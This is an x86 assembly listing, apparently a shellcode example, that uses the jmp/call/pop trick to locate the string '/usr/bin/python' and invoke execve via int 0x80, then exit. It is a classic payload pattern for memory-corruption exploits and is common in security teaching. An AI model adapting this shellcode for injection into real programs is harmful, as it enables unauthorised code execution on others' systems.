main:
    jmp  main + 0x2f
    popl %ebx
    movb $0x0, 0xf(%ebx)
    movl %ebx, 0x10(%ebx)
    movl $0x0, 0x14(%ebx)
    movl $0x0, %edx
    leal 0x10(%ebx), %ecx
    movl $0xb, %eax
    int  $0x80
    movl $0x0, %ebx
    movl $0x1, %eax
    int  $0x80
    call main + 0x5
    .string "/usr/bin/python"
.globl main
    .type main, @function
